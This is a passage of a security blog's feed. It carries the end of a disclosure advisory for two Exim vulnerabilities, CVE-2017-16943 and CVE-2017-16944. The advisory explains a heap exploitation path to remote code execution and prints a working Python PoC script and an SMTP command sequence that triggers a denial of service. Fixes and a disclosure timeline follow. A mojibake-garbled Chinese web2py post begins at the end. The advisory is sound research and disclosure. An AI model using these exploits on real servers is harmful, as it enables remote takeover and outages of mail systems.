 In the PoC, we simply modified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and ended the line. Exim calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt; to reset the buffer and calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;. At this stage, we successfully controlled instruction pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt;.
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_IO_2_1_stdout_&lt;/code&gt;. We forged the vtable of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; and set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; to any call of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt; and the content of first argument. 
 We consulted past CVE exploits and decided to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expand_string&lt;/code&gt;, which executes command with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execv&lt;/code&gt; if we set the first argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, and finally we got our RCE. 
 &lt;img src=&quot;/assets/img/blog/20171211/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;exploit-for-default-configured-exim&quot;&gt;Exploit for default configured exim&lt;/h4&gt;
&lt;p&gt;When dkim is disabled, the PoC above fails because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is the last chunk on heap. This makes the system merge it into a big chunk called &lt;strong&gt;top chunk&lt;/strong&gt; rather than unsorted bin.
The illustrations below describe the difference of heap layout:
&lt;img src=&quot;/assets/img/blog/20171211/8.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.&lt;/p&gt;

&lt;p&gt;After running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use DATA command to send lots of data
 Send huge data, make the chunk big and extend many times. After several extension, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.&lt;/li&gt;
  &lt;li&gt;End DATA transfer and start a new email
 Restart to send an email with BDAT command after the heap chunk is prepared.&lt;/li&gt;
  &lt;li&gt;Adjust &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; again
 Send invalid command with an unprintable charater again to cut the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Finally the heap layout is like:
&lt;img src=&quot;/assets/img/blog/20171211/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.
The following is the PoC for default configured exim:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1280&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DATA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;itself&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;b&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3480&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A demo of our exploit is as below.
&lt;img src=&quot;/assets/img/blog/20171211/7-demo.png&quot; alt=&quot;&quot; /&gt;
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.&lt;/p&gt;

&lt;h1 id=&quot;incorrect-bdat-data-handling-leads-to-dos&quot;&gt;Incorrect BDAT data handling leads to DoS&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis-1&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;When receiving data with BDAT command, SMTP server should not consider a single dot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;â€˜.â€™&lt;/code&gt; in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
250 OK
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is not reset. If the next command is also a BDAT, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lwr_receive_getc&lt;/code&gt; become the same and an infinite loop occurs inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;. Program crashes due to stack exhaustion.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546&quot;&gt;smtp_in.c: 546 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (chunking_data_left &amp;gt; 0)
    return lwr_receive_getc(chunking_data_left--);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 100
.
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 0 LAST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This makes attackers able to launch a resource based DoS attack and then force the whole server down.&lt;/p&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Turn off Chunking option in config file:
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chunking_advertise_hosts =
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Update to 4.89.1 version&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16943 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16944 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;23 November, 2017 09:40 Report to Exim Bugzilla&lt;/li&gt;
  &lt;li&gt;25 November, 2017 16:27 CVE-2017-16943 Patch released&lt;/li&gt;
  &lt;li&gt;28 November, 2017 16:27 CVE-2017-16944 Patch released&lt;/li&gt;
  &lt;li&gt;3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;remarks&quot;&gt;Remarks&lt;/h4&gt;
&lt;p&gt;While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.&lt;/p&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://bugs.exim.org/show_bug.cgi?id=2199
https://bugs.exim.org/show_bug.cgi?id=2201
https://nvd.nist.gov/vuln/detail/CVE-2017-16943
https://nvd.nist.gov/vuln/detail/CVE-2017-16944
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WEB2PY ååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œï¼CVE-2016-3957</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä¸€æ¬¡æ»²é€æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œæˆ‘å€‘é‡åˆ°äº†ç”¨ web2py æ¡†æ¶å»ºæ§‹çš„æ‡‰ç”¨ç¨‹å¼ã€‚ç‚ºäº†æˆåŠŸæ»²é€ç›®æ¨™ï¼Œæˆ‘å€‘ç ”ç©¶äº† web2pyï¼Œç™¼ç¾è©²æ¡†æ¶ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ä¸­å­˜åœ¨ä¸‰å€‹è³‡è¨Šæ´©æ¼å•é¡Œï¼Œé€™äº›æ´©æ¼éƒ½æœƒå°è‡´é ç«¯å‘½ä»¤åŸ·è¡Œ (RCE)ã€‚ç”±æ–¼ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼é è¨­æ˜¯é–‹å•Ÿçš„ï¼Œè‹¥æ²’æœ‰æ‰‹å‹•é—œé–‰ï¼Œæ”»æ“Šè€…å¯ä»¥ç›´æ¥åˆ©ç”¨æ´©æ¼è³‡è¨Šå–å¾—ç³»çµ±åŸ·è¡Œæ¬Šé™ã€‚é€™äº›å•é¡Œç·¨è™Ÿåˆ†åˆ¥ç‚ºï¼šCVE-2016-3952ã€CVE-2016-3953ã€CVE-2016-3954ã€CVE-2016-3957ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;èƒŒæ™¯è€ç”Ÿå¸¸è«‡çš„-pickle-code-execution&quot;&gt;èƒŒæ™¯ï¼è€ç”Ÿå¸¸è«‡çš„ Pickle Code Execution&lt;/h3&gt;

&lt;p&gt;åœ¨ç¹¼çºŒèªªæ˜å‰å¿…é ˆè¦å…ˆèªçŸ¥ä»€éº¼æ˜¯ååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œï¼Ÿååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œåœ¨æœ¬è³ªä¸Šå…¶å¯¦æ˜¯ç‰©ä»¶æ³¨å…¥ï¼Œå®ƒçš„åš´é‡æ€§å–æ±ºæ–¼æ‰€æ³¨å…¥çš„ç‰©ä»¶æœ¬èº«æ˜¯å¦æœƒé€ æˆå±éšªè¡Œç‚ºï¼Œä¾‹å¦‚è®€å¯«æª”ã€‚ä¸€èˆ¬ä¾†èªªè¦é€éååºåˆ—åŒ–å»ºæ§‹ä¸€å€‹æˆåŠŸçš„æ”»æ“Šæœ‰å…©å€‹è¦é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ˜¯å¦å¯æ§åˆ¶ç›®æ¨™æ‰€è¦ååºåˆ—åŒ–çš„å­—ä¸²ã€‚&lt;/li&gt;
  &lt;li&gt;å±éšªè¡Œç‚ºåœ¨ååºåˆ—åŒ–å¾Œæ˜¯å¦æœƒè¢«åŸ·è¡Œã€‚é€™åœ¨å¯¦å‹™ä¸Šå¤§æ¦‚æœ‰ä¸‹é¢å…©ç¨®æƒ…å½¢ï¼š
    &lt;ul&gt;
      &lt;li&gt;å±éšªè¡Œç‚ºæ˜¯å¯«åœ¨é­”æ³•æ–¹æ³• (Magic Method) è£¡é¢ï¼Œä¾‹å¦‚ PHP çš„ __construct åœ¨ç‰©ä»¶ç”Ÿæˆæ™‚ä¸€å®šæœƒåŸ·è¡Œã€‚&lt;/li&gt;
      &lt;li&gt;ååºåˆ—åŒ–å¾Œè¦†è“‹æ—¢æœ‰ç‰©ä»¶ï¼Œå°è‡´æ­£å¸¸ç¨‹å¼æµç¨‹å‡ºç¾å±éšªçµæœã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ååºåˆ—åŒ–çš„å•é¡Œåœ¨æ¯å€‹ç¨‹å¼èªè¨€éƒ½æœƒç™¼ç”Ÿï¼Œä½†é€šå¸¸éœ€è¦æ­é…çœ‹ç¨‹å¼ç¢¼æ‹¼æ¹Šå‡ºå¯ä»¥ç”¨çš„æ”»æ“Šæµç¨‹ï¼Œæ¯”è¼ƒé›£åˆ©ç”¨ã€‚ä¸éï¼ŒæŸäº›å¯¦ä½œåºåˆ—åŒ–çš„å‡½å¼åº«æœƒå°‡ç¨‹å¼é‚è¼¯ä¹Ÿåºåˆ—åŒ–æˆå­—ä¸²ï¼Œå› æ­¤æ”»æ“Šè€…å¯ä»¥è‡ªå®šç¾©ç‰©ä»¶ç›´æ¥ä½¿ç”¨ï¼Œä¸å†éœ€è¦æ‹¼æ¹Šï¼Œä¾‹å¦‚ä»Šå¤©è¦æçš„ Python Pickleã€‚&lt;/p&gt;

